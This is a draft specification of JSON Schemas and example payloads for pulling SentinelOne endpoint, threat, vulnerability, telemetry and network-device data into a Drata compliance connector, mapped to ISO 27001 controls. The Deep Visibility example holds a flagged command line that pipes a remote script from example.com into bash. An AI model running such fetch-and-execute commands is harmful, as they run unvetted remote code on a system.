# SentinelOne API — JSON Schema Drafts for Drata Custom Connection

**Issue:** [RBR-524](/RBR/issues/RBR-524)  
**Purpose:** Draft JSON Schemas for five evidence classes to be used when creating the Drata Custom Connection in [RBR-525](/RBR/issues/RBR-525).  
**Status:** DRAFT — validate against live API responses before finalizing.

Each schema defines the shape of data the connector will extract from the SentinelOne API. Fields marked as `dedup_key` form the unique composite key used to deduplicate records across polling cycles.

---

## Schema 1: agent_inventory

**SentinelOne endpoint:** `GET /web/api/v2.1/agents`  
**Purpose:** Endpoint device inventory — maps to ISO 27001 A.8.1 (Inventory of Assets).  
**Dedup key:** `uuid` (SentinelOne agent UUID)  
**Polling strategy:** Full page-through with cursor; track `updatedAt` for incremental delta.

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://aira.io/schemas/sentinelone/agent_inventory.schema.json",
  "title": "SentinelOne Agent Inventory",
  "description": "Endpoint device inventory from SentinelOne /web/api/v2.1/agents. Maps to ISO 27001 A.8.1.",
  "type": "object",
  "required": ["uuid", "computerName", "osType", "osName", "lastActiveDate", "isActive"],
  "properties": {
    "uuid": {
      "type": "string",
      "format": "uuid",
      "description": "SentinelOne agent UUID. Dedup key.",
      "x-dedup-key": true
    },
    "computerName": {
      "type": "string",
      "description": "Hostname of the endpoint."
    },
    "osType": {
      "type": "string",
      "enum": ["windows", "macos", "linux", "windows_legacy"],
      "description": "Operating system family."
    },
    "osName": {
      "type": "string",
      "description": "Full OS name and version (e.g., 'macOS 14.4.1')."
    },
    "osVersion": {
      "type": "string",
      "description": "OS version string."
    },
    "lastActiveDate": {
      "type": "string",
      "format": "date-time",
      "description": "ISO 8601 timestamp of last agent heartbeat."
    },
    "isActive": {
      "type": "boolean",
      "description": "Whether the agent is currently active (heartbeat within window)."
    },
    "isDecommissioned": {
      "type": "boolean",
      "description": "Whether the endpoint has been decommissioned in S1."
    },
    "siteName": {
      "type": "string",
      "description": "Name of the S1 site the endpoint belongs to."
    },
    "siteId": {
      "type": "string",
      "description": "S1 site ID."
    },
    "groupName": {
      "type": "string",
      "description": "Name of the S1 dynamic/static group."
    },
    "externalIp": {
      "type": "string",
      "format": "ipv4",
      "description": "Last known external IP address."
    },
    "internalIp": {
      "type": "string",
      "format": "ipv4",
      "description": "Last known internal IP address."
    },
    "cpuCount": {
      "type": "integer",
      "description": "Number of CPU cores."
    },
    "totalMemory": {
      "type": "integer",
      "description": "Total RAM in MB."
    },
    "diskEncryptionStatus": {
      "type": "string",
      "enum": ["encrypted", "not_encrypted", "encrypting", "unknown"],
      "description": "Disk encryption status. Maps to ISO 27001 A.8.24 (Use of Cryptography)."
    },
    "firewallEnabled": {
      "type": "boolean",
      "description": "Whether host firewall is enabled. Maps to ISO 27001 A.8.20."
    },
    "serialNumber": {
      "type": "string",
      "description": "Hardware serial number."
    },
    "modelName": {
      "type": "string",
      "description": "Hardware model (e.g., 'iMac19,1')."
    },
    "agentVersion": {
      "type": "string",
      "description": "SentinelOne agent version string."
    },
    "registeredAt": {
      "type": "string",
      "format": "date-time",
      "description": "When the agent was first registered."
    },
    "updatedAt": {
      "type": "string",
      "format": "date-time",
      "description": "Last update timestamp. Used for incremental polling."
    },
    "scanStatus": {
      "type": "string",
      "enum": ["started", "aborted", "failed", "finished", "none"],
      "description": "Last full disk scan status."
    },
    "threatRebootRequired": {
      "type": "boolean",
      "description": "Whether a reboot is required to complete threat remediation."
    },
    "userName": {
      "type": "string",
      "description": "Last logged-in user."
    },
    "accountName": {
      "type": "string",
      "description": "S1 account name."
    },
    "accountId": {
      "type": "string",
      "description": "S1 account ID."
    }
  }
}
```

**Example payload:**

```json
{
  "uuid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "computerName": "MBP-jane-doe",
  "osType": "macos",
  "osName": "macOS 14.4.1",
  "osVersion": "14.4.1",
  "lastActiveDate": "2026-07-16T14:30:00Z",
  "isActive": true,
  "isDecommissioned": false,
  "siteName": "Aira HQ",
  "siteId": "123456789012345678",
  "groupName": "Default Group",
  "externalIp": "203.0.113.42",
  "internalIp": "10.0.1.100",
  "cpuCount": 10,
  "totalMemory": 32768,
  "diskEncryptionStatus": "encrypted",
  "firewallEnabled": true,
  "serialNumber": "C02ABC12DEF3",
  "modelName": "MacBookPro18,1",
  "agentVersion": "23.4.1.2",
  "registeredAt": "2025-01-15T09:00:00Z",
  "updatedAt": "2026-07-16T14:30:00Z",
  "scanStatus": "finished",
  "threatRebootRequired": false
}
```

---

## Schema 2: threat_event

**SentinelOne endpoint:** `GET /web/api/v2.1/threats`  
**Purpose:** Threat detection and resolution events. Maps to ISO 27001 A.8.16 (Monitoring Activities) and A.8.7 (Protection Against Malware).  
**Dedup key:** `threat_id` (the `id` field in the threat object)  
**Polling strategy:** Poll with `createdAt__gte=<last_poll_time>` for incremental; cursor-based page-through for backfill.

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://aira.io/schemas/sentinelone/threat_event.schema.json",
  "title": "SentinelOne Threat Event",
  "description": "Threat detection and resolution events from SentinelOne /web/api/v2.1/threats. Maps to ISO 27001 A.8.7, A.8.16.",
  "type": "object",
  "required": ["threat_id", "detected_at", "classification", "mitigation_status"],
  "properties": {
    "threat_id": {
      "type": "string",
      "description": "SentinelOne threat ID. Dedup key.",
      "x-dedup-key": true
    },
    "detected_at": {
      "type": "string",
      "format": "date-time",
      "description": "When the threat was first detected (createdAt)."
    },
    "resolved_at": {
      "type": "string",
      "format": "date-time",
      "description": "When the threat was resolved, if resolved."
    },
    "updated_at": {
      "type": "string",
      "format": "date-time",
      "description": "Last update timestamp."
    },
    "classification": {
      "type": "string",
      "enum": ["malware", "pup", "adware", "ransomware", "phishing", "exploit", "trojan", "virus", "worm", "rootkit", "spyware", "cryptominer", "unknown"],
      "description": "S1 threat classification."
    },
    "classification_source": {
      "type": "string",
      "enum": ["static", "cloud", "reputation", "behavioral_ai", "app_control"],
      "description": "Which engine classified the threat (Static AI, Cloud, etc.)."
    },
    "confidence_level": {
      "type": "string",
      "enum": ["malicious", "suspicious"],
      "description": "Detection confidence level."
    },
    "mitigation_status": {
      "type": "string",
      "enum": ["mitigated", "not_mitigated", "partially_mitigated", "marked_as_benign", "marked_as_threat"],
      "description": "Whether the threat was mitigated. Maps to A.8.7 control effectiveness."
    },
    "resolution_status": {
      "type": "string",
      "enum": ["resolved", "unresolved", "in_progress"],
      "description": "Overall threat resolution state."
    },
    "resolved_by": {
      "type": ["string", "null"],
      "description": "User or system that resolved the threat."
    },
    "severity": {
      "type": "string",
      "enum": ["low", "medium", "high", "critical"],
      "description": "S1-assigned severity."
    },
    "agent_uuid": {
      "type": "string",
      "format": "uuid",
      "description": "Agent UUID of the affected endpoint. Use to correlate with agent_inventory."
    },
    "computer_name": {
      "type": "string",
      "description": "Endpoint hostname at detection time."
    },
    "site_name": {
      "type": "string",
      "description": "S1 site name."
    },
    "site_id": {
      "type": "string",
      "description": "S1 site ID."
    },
    "account_name": {
      "type": "string",
      "description": "S1 account name."
    },
    "account_id": {
      "type": "string",
      "description": "S1 account ID."
    },
    "threat_name": {
      "type": "string",
      "description": "Name of the detected threat (e.g., 'Trojan.GenericKD.12345')."
    },
    "file_path": {
      "type": ["string", "null"],
      "description": "File path of the detected threat, if file-based."
    },
    "file_hash_sha1": {
      "type": ["string", "null"],
      "description": "SHA-1 hash of the file."
    },
    "file_hash_sha256": {
      "type": ["string", "null"],
      "description": "SHA-256 hash of the file."
    },
    "process_name": {
      "type": ["string", "null"],
      "description": "Process name associated with the threat."
    },
    "initiated_by": {
      "type": "string",
      "enum": ["agent_policy", "user_action", "system", "api"],
      "description": "What triggered the threat detection."
    },
    "indicators": {
      "type": "array",
      "items": { "type": "string" },
      "description": "List of indicator names that fired on this threat."
    }
  }
}
```

**Example payload:**

```json
{
  "threat_id": "9876543210987654321",
  "detected_at": "2026-07-15T08:12:00Z",
  "resolved_at": "2026-07-15T08:13:30Z",
  "updated_at": "2026-07-15T08:13:30Z",
  "classification": "malware",
  "classification_source": "behavioral_ai",
  "confidence_level": "malicious",
  "mitigation_status": "mitigated",
  "resolution_status": "resolved",
  "resolved_by": "SentinelOne Agent",
  "severity": "high",
  "agent_uuid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "computer_name": "MBP-jane-doe",
  "site_name": "Aira HQ",
  "site_id": "123456789012345678",
  "threat_name": "Trojan.GenericKD.48912345",
  "file_path": "/Users/jane/Downloads/sketchy.dmg",
  "file_hash_sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
  "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "process_name": "Installer",
  "initiated_by": "agent_policy",
  "indicators": ["SuspiciousFileDownload", "UnsignedBinary"]
}
```

---

## Schema 3: vulnerability_finding

**SentinelOne endpoint:** `GET /web/api/v2.1/application-risks`  
**Purpose:** Application vulnerability (CVE) findings per endpoint. Maps to ISO 27001 A.8.8 (Management of Technical Vulnerabilities).  
**Dedup key:** `(cve_id, agent_uuid)` composite key  
**Polling strategy:** Cursor-based page-through. Track `detected_at` for incremental.

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://aira.io/schemas/sentinelone/vulnerability_finding.schema.json",
  "title": "SentinelOne Vulnerability Finding",
  "description": "Application vulnerability (CVE) findings from SentinelOne /web/api/v2.1/application-risks. Maps to ISO 27001 A.8.8.",
  "type": "object",
  "required": ["cve_id", "agent_uuid", "detected_at", "severity"],
  "properties": {
    "cve_id": {
      "type": "string",
      "pattern": "^CVE-\\d{4}-\\d{4,}$",
      "description": "CVE identifier. Part of composite dedup key with agent_uuid.",
      "x-dedup-key": true
    },
    "agent_uuid": {
      "type": "string",
      "format": "uuid",
      "description": "SentinelOne agent UUID of the affected endpoint. Part of composite dedup key.",
      "x-dedup-key": true
    },
    "finding_id": {
      "type": "string",
      "description": "S1 application-risk internal ID."
    },
    "application_name": {
      "type": "string",
      "description": "Name of the vulnerable application (e.g., 'Google Chrome')."
    },
    "application_version": {
      "type": "string",
      "description": "Installed version of the vulnerable application."
    },
    "application_vendor": {
      "type": "string",
      "description": "Vendor of the vulnerable application."
    },
    "detected_at": {
      "type": "string",
      "format": "date-time",
      "description": "When the vulnerability was detected."
    },
    "mitigated_at": {
      "type": ["string", "null"],
      "format": "date-time",
      "description": "When the vulnerability was mitigated, if mitigated."
    },
    "is_mitigated": {
      "type": "boolean",
      "description": "Whether the vulnerability has been mitigated (patched or app removed)."
    },
    "severity": {
      "type": "string",
      "enum": ["none", "low", "medium", "high", "critical"],
      "description": "CVSS-based severity rating."
    },
    "cvss_score": {
      "type": ["number", "null"],
      "description": "CVSS v3.x score (0.0-10.0)."
    },
    "cvss_vector": {
      "type": ["string", "null"],
      "description": "CVSS vector string (e.g., 'AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H')."
    },
    "cve_description": {
      "type": "string",
      "description": "Short description of the CVE."
    },
    "cve_published_at": {
      "type": ["string", "null"],
      "format": "date-time",
      "description": "When the CVE was published by NVD."
    },
    "computer_name": {
      "type": "string",
      "description": "Endpoint hostname."
    },
    "site_name": {
      "type": "string",
      "description": "S1 site name."
    },
    "site_id": {
      "type": "string",
      "description": "S1 site ID."
    },
    "account_name": {
      "type": "string",
      "description": "S1 account name."
    },
    "account_id": {
      "type": "string",
      "description": "S1 account ID."
    },
    "remediation": {
      "type": ["string", "null"],
      "description": "Recommended remediation action from S1."
    },
    "exploit_available": {
      "type": "boolean",
      "description": "Whether a known exploit exists for this CVE."
    }
  }
}
```

**Example payload:**

```json
{
  "cve_id": "CVE-2026-12345",
  "agent_uuid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "finding_id": "ar_abc123def456",
  "application_name": "Google Chrome",
  "application_version": "128.0.6613.36",
  "application_vendor": "Google LLC",
  "detected_at": "2026-07-14T02:00:00Z",
  "mitigated_at": null,
  "is_mitigated": false,
  "severity": "high",
  "cvss_score": 8.8,
  "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
  "cve_description": "Use-after-free in V8 in Google Chrome prior to 128.0.6613.84...",
  "cve_published_at": "2026-07-10T00:00:00Z",
  "computer_name": "MBP-jane-doe",
  "site_name": "Aira HQ",
  "site_id": "123456789012345678",
  "remediation": "Update Google Chrome to version 128.0.6613.84 or later.",
  "exploit_available": true
}
```

---

## Schema 4: dv_event

**SentinelOne endpoint:** `GET /web/api/v2.1/dv/events`  
**Purpose:** Deep Visibility telemetry events (process, file, network, registry, etc.). Maps to ISO 27001 A.8.16 (Monitoring Activities) and A.8.15 (Logging).  
**Dedup key:** `event_id`  
**Polling strategy:** Cursor-based with time range filtering (`fromDate`, `toDate`). DV uses a special query DSL.

> **Note:** Deep Visibility events are high-volume. The connector should use narrow time windows (5-15 min) and cursor pagination. Do NOT attempt to backfill all historical DV data through Drata — this is operational telemetry, not periodic compliance evidence.

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://aira.io/schemas/sentinelone/dv_event.schema.json",
  "title": "SentinelOne Deep Visibility Event",
  "description": "Deep Visibility telemetry event from SentinelOne /web/api/v2.1/dv/events. Maps to ISO 27001 A.8.15, A.8.16.",
  "type": "object",
  "required": ["event_id", "event_type", "event_time", "agent_uuid"],
  "properties": {
    "event_id": {
      "type": "string",
      "description": "Unique event identifier from DV. Dedup key.",
      "x-dedup-key": true
    },
    "event_type": {
      "type": "string",
      "description": "DV event type (e.g., 'Process Creation', 'File Modification', 'Network Connection', 'DNS Request', 'Registry Key Create', 'Scheduled Task')."
    },
    "event_time": {
      "type": "string",
      "format": "date-time",
      "description": "Timestamp of the event."
    },
    "event_sub_type": {
      "type": ["string", "null"],
      "description": "Sub-type of the event if applicable."
    },
    "agent_uuid": {
      "type": "string",
      "format": "uuid",
      "description": "Agent UUID of the endpoint that generated this event."
    },
    "computer_name": {
      "type": "string",
      "description": "Endpoint hostname."
    },
    "site_name": {
      "type": "string",
      "description": "S1 site name."
    },
    "site_id": {
      "type": "string",
      "description": "S1 site ID."
    },
    "process_name": {
      "type": ["string", "null"],
      "description": "Name of the process associated with the event."
    },
    "process_cmd": {
      "type": ["string", "null"],
      "description": "Command line of the process."
    },
    "process_user": {
      "type": ["string", "null"],
      "description": "User context the process ran under."
    },
    "process_pid": {
      "type": ["integer", "null"],
      "description": "Process ID."
    },
    "parent_process_name": {
      "type": ["string", "null"],
      "description": "Parent process name."
    },
    "parent_process_pid": {
      "type": ["integer", "null"],
      "description": "Parent process ID."
    },
    "file_path": {
      "type": ["string", "null"],
      "description": "File path, if file-related event."
    },
    "file_hash_sha256": {
      "type": ["string", "null"],
      "description": "SHA-256 hash, if file-related event."
    },
    "src_ip": {
      "type": ["string", "null"],
      "format": "ipv4",
      "description": "Source IP address, if network event."
    },
    "dest_ip": {
      "type": ["string", "null"],
      "format": "ipv4",
      "description": "Destination IP address, if network event."
    },
    "dest_port": {
      "type": ["integer", "null"],
      "description": "Destination port, if network event."
    },
    "dns_request": {
      "type": ["string", "null"],
      "description": "DNS query, if DNS event."
    },
    "dns_response": {
      "type": ["string", "null"],
      "description": "DNS response IP, if DNS event."
    },
    "registry_key_path": {
      "type": ["string", "null"],
      "description": "Registry key path, if registry event (Windows only)."
    },
    "registry_value": {
      "type": ["string", "null"],
      "description": "Registry value, if registry event."
    },
    "indicator_name": {
      "type": ["string", "null"],
      "description": "Name of the behavioral indicator that triggered, if this event was flagged."
    },
    "indicator_category": {
      "type": ["string", "null"],
      "description": "Category of the behavioral indicator."
    },
    "is_flagged": {
      "type": "boolean",
      "description": "Whether this event was flagged by a detection rule."
    }
  }
}
```

**Example payload:**

```json
{
  "event_id": "dv_abc123def456ghi789",
  "event_type": "Process Creation",
  "event_time": "2026-07-16T14:30:00Z",
  "agent_uuid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "computer_name": "MBP-jane-doe",
  "site_name": "Aira HQ",
  "site_id": "123456789012345678",
  "process_name": "bash",
  "process_cmd": "/bin/bash -c 'curl -s https://example.com/script.sh | bash'",
  "process_user": "jane",
  "process_pid": 12345,
  "parent_process_name": "Terminal",
  "parent_process_pid": 12340,
  "indicator_name": "SuspiciousScriptExecution",
  "indicator_category": "Execution",
  "is_flagged": true
}
```

---

## Schema 5: ranger_device

**SentinelOne endpoint:** `GET /web/api/v2.1/ranger/devices`  
**Purpose:** Network-discovered devices (unmanaged endpoints, IoT, network appliances). Maps to ISO 27001 A.8.1 (Inventory of Assets — extended for network-visible but unmanaged devices).  
**Dedup key:** `device_id` (Ranger device ID)  
**Polling strategy:** Cursor-based page-through. Ranger data refreshes on network scan cycles (typically every 24h).

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://aira.io/schemas/sentinelone/ranger_device.schema.json",
  "title": "SentinelOne Ranger Network Device",
  "description": "Network-discovered devices from SentinelOne /web/api/v2.1/ranger/devices. Maps to ISO 27001 A.8.1 (extended asset inventory).",
  "type": "object",
  "required": ["device_id", "ip_addresses", "discovered_at", "site_id"],
  "properties": {
    "device_id": {
      "type": "string",
      "description": "Ranger device ID. Dedup key.",
      "x-dedup-key": true
    },
    "ip_addresses": {
      "type": "array",
      "items": {
        "type": "string",
        "format": "ipv4"
      },
      "description": "IP addresses associated with the device."
    },
    "mac_addresses": {
      "type": "array",
      "items": {
        "type": "string",
        "pattern": "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
      },
      "description": "MAC addresses associated with the device."
    },
    "hostname": {
      "type": ["string", "null"],
      "description": "Device hostname, if discovered."
    },
    "device_type": {
      "type": "string",
      "enum": ["workstation", "server", "mobile", "network_appliance", "printer", "iot", "unknown", "virtual_machine"],
      "description": "Ranger-classified device type."
    },
    "os_type": {
      "type": ["string", "null"],
      "enum": ["windows", "macos", "linux", "ios", "android", "embedded", "unknown"],
      "description": "Detected OS family."
    },
    "os_name": {
      "type": ["string", "null"],
      "description": "Detected OS name and version."
    },
    "manufacturer": {
      "type": ["string", "null"],
      "description": "Hardware manufacturer (e.g., 'Apple Inc.', 'Dell Inc.')."
    },
    "model": {
      "type": ["string", "null"],
      "description": "Device model."
    },
    "discovered_at": {
      "type": "string",
      "format": "date-time",
      "description": "When the device was first discovered on the network."
    },
    "last_seen_at": {
      "type": "string",
      "format": "date-time",
      "description": "Last time the device was seen on the network."
    },
    "updated_at": {
      "type": "string",
      "format": "date-time",
      "description": "Last update timestamp."
    },
    "site_name": {
      "type": "string",
      "description": "S1 site name."
    },
    "site_id": {
      "type": "string",
      "description": "S1 site ID."
    },
    "account_name": {
      "type": "string",
      "description": "S1 account name."
    },
    "account_id": {
      "type": "string",
      "description": "S1 account ID."
    },
    "discovery_method": {
      "type": "string",
      "enum": ["active_scan", "passive_listener", "agent_proxy"],
      "description": "How the device was discovered."
    },
    "is_managed": {
      "type": "boolean",
      "description": "Whether the device is managed by a SentinelOne agent."
    },
    "managed_agent_uuid": {
      "type": ["string", "null"],
      "format": "uuid",
      "description": "If managed, the agent UUID (correlate with agent_inventory)."
    },
    "open_ports": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "port": { "type": "integer" },
          "protocol": { "type": "string", "enum": ["tcp", "udp"] },
          "service": { "type": "string" }
        }
      },
      "description": "Open TCP/UDP ports detected on the device."
    },
    "network_name": {
      "type": "string",
      "description": "Network segment name the device was discovered on."
    },
    "vlan_id": {
      "type": ["integer", "null"],
      "description": "VLAN ID if applicable."
    },
    "risk_score": {
      "type": ["integer", "null"],
      "description": "Ranger risk score (0-10). Unmanaged devices with open ports score higher."
    }
  }
}
```

**Example payload:**

```json
{
  "device_id": "ranger_dev_0123456789abcdef",
  "ip_addresses": ["10.0.1.50"],
  "mac_addresses": ["00:1A:2B:3C:4D:5E"],
  "hostname": "printer-office-2.local",
  "device_type": "printer",
  "os_type": "embedded",
  "os_name": null,
  "manufacturer": "HP Inc.",
  "model": "LaserJet Pro M404dn",
  "discovered_at": "2026-06-01T12:00:00Z",
  "last_seen_at": "2026-07-16T14:25:00Z",
  "updated_at": "2026-07-16T14:25:00Z",
  "site_name": "Aira HQ",
  "site_id": "123456789012345678",
  "discovery_method": "passive_listener",
  "is_managed": false,
  "managed_agent_uuid": null,
  "open_ports": [
    { "port": 9100, "protocol": "tcp", "service": "jetdirect" },
    { "port": 80, "protocol": "tcp", "service": "http" },
    { "port": 443, "protocol": "tcp", "service": "https" }
  ],
  "network_name": "Aira-Corp-LAN",
  "vlan_id": 100,
  "risk_score": 3
}
```

---

## ISO 27001 Control Mapping

| Evidence Class | S1 Endpoint | ISO 27001:2022 Controls | Primary Evidence For |
|----------------|-------------|--------------------------|---------------------|
| `agent_inventory` | `GET /agents` | A.8.1, A.8.9, A.8.24, A.8.20 | Asset inventory, configuration management, crypto, network security |
| `threat_event` | `GET /threats` | A.8.7, A.8.16 | Malware protection, monitoring |
| `vulnerability_finding` | `GET /application-risks` | A.8.8 | Technical vulnerability management |
| `dv_event` | `GET /dv/events` | A.8.15, A.8.16 | Logging, monitoring |
| `ranger_device` | `GET /ranger/devices` | A.8.1 (extended) | Asset inventory — unmanaged/network devices |

---

## Schema Validation Notes

1. **These are drafts.** Validate each schema against actual API responses before creating the Drata Custom Connection in [RBR-525](/RBR/issues/RBR-525). Fields may differ between S1 tenant versions and API revisions.

2. **Nullable fields.** Fields typed as `["string", "null"]` may be absent or null in the API response. The connector should handle both cases.

3. **Additional properties.** The schemas intentionally omit some S1 API response fields (e.g., internal IDs, deprecated fields) to keep the schema focused on compliance-relevant data. The connector may strip unknown fields or pass them through to Drata — either is acceptable as long as the required fields are present.

4. **Dedup safety.** Each schema identifies a unique `x-dedup-key` field or composite. The connector must use these keys to avoid creating duplicate evidence records in Drata on repeated polls.

5. **Time fields.** All timestamps are ISO 8601 with UTC timezone (`Z` suffix). S1 returns timestamps in UTC.

6. **Security review** (SecurityEngineering, RBR-524):
   - Agent inventory exposes endpoint metadata (hostname, IP, OS, logged-in user) — this is expected for A.8.1 evidence.
   - Threat events include file hashes and paths — ensure Drata field-level access controls limit visibility to authorized compliance reviewers.
   - DV events are high-volume operational telemetry — the connector should apply a narrow time window and NOT backfill all historical DV data. DV evidence for compliance is about demonstrating that monitoring IS occurring, not about providing full event logs through Drata.
   - Ranger devices may discover non-Aira network devices — segment by network/VLAN where possible.